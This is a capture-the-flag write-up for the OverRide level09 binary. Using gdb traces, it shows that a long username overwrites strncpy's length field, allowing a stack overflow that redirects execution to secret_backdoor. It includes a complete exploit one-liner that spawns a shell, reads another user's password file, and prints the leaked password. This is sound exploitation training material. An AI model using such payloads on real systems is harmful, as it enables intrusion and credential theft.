We keep that in our mind, might be useful later if we can buffer overflow or string format exploit.

```assembly
(gdb) disas secret_backdoor 
Dump of assembler code for function secret_backdoor:
   0x000055555555488c <+0>:	push   %rbp
```

Now, let's try to rewrite some parts of the memory.

```assembly
(gdb) disas handle_msg 
Dump of assembler code for function handle_msg:
   0x00005555555548c0 <+0>:	push   %rbp
   0x00005555555548c1 <+1>:	mov    %rsp,%rbp
   0x00005555555548c4 <+4>:	sub    $0xc0,%rsp
   0x00005555555548cb <+11>:	lea    -0xc0(%rbp),%rax
   0x00005555555548d2 <+18>:	add    $0x8c,%rax
   0x00005555555548d8 <+24>:	movq   $0x0,(%rax)
   0x00005555555548df <+31>:	movq   $0x0,0x8(%rax)
   0x00005555555548e7 <+39>:	movq   $0x0,0x10(%rax)
   0x00005555555548ef <+47>:	movq   $0x0,0x18(%rax)
   0x00005555555548f7 <+55>:	movq   $0x0,0x20(%rax)
   0x00005555555548ff <+63>:	movl   $0x8c,-0xc(%rbp)
   0x0000555555554906 <+70>:	lea    -0xc0(%rbp),%rax
   0x000055555555490d <+77>:	mov    %rax,%rdi
   0x0000555555554910 <+80>:	callq  0x5555555549cd <set_username>
   0x0000555555554915 <+85>:	lea    -0xc0(%rbp),%rax
   0x000055555555491c <+92>:	mov    %rax,%rdi
   0x000055555555491f <+95>:	callq  0x555555554932 <set_msg>
=> 0x0000555555554924 <+100>:	lea    0x295(%rip),%rdi        # 0x555555554bc0
   0x000055555555492b <+107>:	callq  0x555555554730 <puts@plt>
   0x0000555555554930 <+112>:	leaveq 
   0x0000555555554931 <+113>:	retq  
```

With gdb, we can see some kind of structure inside `handle_msg`. Let's try to see if we're right on this one

```assembly
Continuing.
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: AAAAAAAAAAAAAAAAAAAAAAAAAAAA
>: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAA
>: Msg @Unix-Dude
>>: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Breakpoint 2, 0x0000555555554924 in handle_msg ()
(gdb) x/46x $sp
0x7fffffffe3f0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe400:	0x42424242	0x42424242	0x42424242	0x0a424242
0x7fffffffe410:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe420:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe430:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe440:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe450:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe460:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe470:	0x00000000	0x00000000	0x00000000	0x41414141
0x7fffffffe480:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe490:	0x41414141	0x41414141	0x0000000a	0x00000000
0x7fffffffe4a0:	0x00000000	0x0000008c

```

We can see that there is a spot for the message, for the username and for a int (?) and it looks like the `size of size_max(message) + size_max(username)`
Let's look a bit further :

```assembly
(gdb) x/52x $sp
0x7fffffffe3f0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe400:	0x42424242	0x42424242	0x42424242	0x0a424242
0x7fffffffe410:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe420:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe430:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe440:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe450:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe460:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe470:	0x00000000	0x00000000	0x00000000	0x41414141
0x7fffffffe480:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe490:	0x41414141	0x41414141	0x0000000a	0x00000000
0x7fffffffe4a0:	0x00000000	0x0000008c	0xffffe4c0	0x00007fff
0x7fffffffe4b0:	0xffffe4c0	0x00007fff	0x55554abd	0x00005555
```

The eight lasts bytes correspond to the eip of the function `handle_message`

```assembly
(gdb) disas main
Dump of assembler code for function main:
   0x0000555555554aa8 <+0>:	push   %rbp
   0x0000555555554aa9 <+1>:	mov    %rsp,%rbp
   0x0000555555554aac <+4>:	lea    0x15d(%rip),%rdi        # 0x555555554c10
   0x0000555555554ab3 <+11>:	callq  0x555555554730 <puts@plt>
   0x0000555555554ab8 <+16>:	callq  0x5555555548c0 <handle_msg>
=> 0x0000555555554abd <+21>:	mov    $0x0,%eax
   0x0000555555554ac2 <+26>:	pop    %rbp
   0x0000555555554ac3 <+27>:	retq  
```

So maybe if we go further with the username, we can overwrite this eip. But it looks like there is some protection, still, let's try it.

```assembly
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/users/level09/level09 

Breakpoint 1, 0x0000555555554aac in main ()
(gdb) c
Continuing.
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
>: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA>: Msg @Unix-Dude
>>: BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB

Breakpoint 2, 0x0000555555554924 in handle_msg ()
(gdb) x/52x $sp
0x7fffffffe3f0:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe400:	0x42424242	0x42424242	0x42424242	0x42424242
0x7fffffffe410:	0x42424242	0x42424242	0x42424242	0x000a4242
0x7fffffffe420:	0x00000000	0x00000000	0x00000000	0x00000000
0x7fffffffe430:	0x00000000	0x00000000	0xf7a945da	0x00007fff
0x7fffffffe440:	0x00000086	0x00000000	0x0000002d	0x00000000
0x7fffffffe450:	0x0000000a	0x00000000	0x55554c10	0x00005555
0x7fffffffe460:	0xffffe5a0	0x00007fff	0xf7a95d45	0x00007fff
0x7fffffffe470:	0xf7dd4260	0x00007fff	0xf7a9608f	0x41414141
0x7fffffffe480:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe490:	0x41414141	0x41414141	0x41414141	0x41414141
0x7fffffffe4a0:	0x41414141	0x00000041	0xffffe4c0	0x00007fff
0x7fffffffe4b0:	0xffffe4c0	0x00007fff	0x55554abd	0x00005555
```

I gave 41 A's but it never go further from that, even if we give more A's. But we can see that `8c` has been changed by `41` so we can change that.

```assembly
(gdb) disas set_msg 
Dump of assembler code for function set_msg:
[...]
   0x00005555555549b2 <+128>:	lea    -0x400(%rbp),%rcx
   0x00005555555549b9 <+135>:	mov    -0x408(%rbp),%rax
   0x00005555555549c0 <+142>:	mov    %rcx,%rsi
   0x00005555555549c3 <+145>:	mov    %rax,%rdi
=> 0x00005555555549c6 <+148>:	callq  0x555555554720 <strncpy@plt>
   0x00005555555549cb <+153>:	leaveq 
   0x00005555555549cc <+154>:	retq   

```

Let's put a breakpoint here and see the arguments of strncpy (the last one is the length, let's focus on that).
Here with a username with less than 41 char.

```assembly
(gdb) i r
rax            0x7fffffffe3f0	140737488348144
rbx            0x0	0
rcx            0x7fffffffdfe0	140737488347104
rdx            0x8c	140
rsi            0x7fffffffdfe0	140737488347104
```

Here with 41 A's

```assembly
(gdb) i r
rax            0x7fffffffe3f0	140737488348144
rbx            0x0	0
rcx            0x7fffffffdfe0	140737488347104
rdx            0x41	65
rsi            0x7fffffffdfe0	140737488347104

(gdb) x/s 0x7fffffffdfe0
0x7fffffffdfe0:	 'B' <repeats 30 times>, "\n"
```

`rsi` is the starting address of our structure.
So when we give a big username, we can change the length of the message we will copy inside the stack. 
So let's try this:

- We need to overwrite `0x7fffffffe4b8-0x7fffffffe4bc` (`0x7fffffffe4b8 - 0x7fffffffe3f0 = 200`) So the first 200 bytes won't matter, we need to give the address of `secret_backdoor` from byte 201 to 208
- We need to change the length so we can write 208 bytes (`0xd0`)

```bash
level09@OverRide:~$ (python -c 'print("\xd0" * 41)'; python -c 'print("B" * 200 + "\x8c\x48\x55\x55\x55\x55\x00\x00")'; python -c 'print("/bin/sh")'; python -c 'print("cat /home/users/end/.pass")') | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, �����������������������������������������>: Msg @Unix-Dude
>>: >: Msg sent!
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
Segmentation fault (core dumped)
```

```bash
su end
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

